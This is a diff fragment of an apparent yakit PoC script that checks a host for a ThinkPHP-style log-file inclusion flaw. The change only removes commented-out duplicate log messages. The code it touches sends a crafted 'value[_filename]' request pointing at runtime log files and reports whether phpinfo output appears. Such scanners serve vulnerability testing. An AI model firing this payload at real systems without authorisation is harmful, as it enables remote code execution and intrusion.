@@ -45,7 +45,6 @@ Poc = func (host) {
         die(err)
         body = string(req)
         if str.Contains(body, "PHP Version") {
-            //yakit.Info("存在漏洞")
             yakit.Info("存在漏洞")
         }else{
             payload = "index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/" + logfile
@@ -53,15 +52,12 @@ Poc = func (host) {
             die(err)
             body = string(req)
             if str.Contains(body, "PHP Version") {
-                //yakit.Info("存在漏洞")
                 yakit.Info("存在漏洞")
             }else{
-                //yakit.Info("漏洞不存在")
                 yakit.Info("漏洞不存在")
             }
         }
     }else{
-        //yakit.Info("发包失败")
         yakit.Info("发包失败")
     }
 }
